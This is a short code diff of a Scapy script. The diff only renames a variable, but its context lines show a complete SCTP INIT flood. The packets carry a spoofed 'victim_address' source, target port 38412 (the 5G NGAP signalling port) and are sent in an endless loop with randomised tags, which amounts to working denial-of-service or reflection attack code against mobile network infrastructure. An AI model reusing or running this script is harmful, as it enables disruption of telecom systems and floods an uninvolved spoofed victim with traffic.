@@ -12,7 +12,7 @@ dst_port = 38412
 eth_ip = Ether() / IP(src=victim_address, dst=dst_address)
 sctp = SCTP(sport=src_port, dport=dst_port, tag=0x0)
 
-chunk_init = SCTPChunkInit(
+init_chunk = SCTPChunkInit(
     init_tag=randint(1, pow(2, 32) - 1),
     a_rwnd=pow(2, 16) - 1,
     n_in_streams=10,
@@ -20,7 +20,7 @@ chunk_init = SCTPChunkInit(
     init_tsn=randint(0, pow(2, 32) - 1)
 )
 
-init_pkt = eth_ip / sctp / chunk_init
+init_pkt = eth_ip / sctp / init_chunk
 
 while True:
     sendp(init_pkt, iface=network_interface)
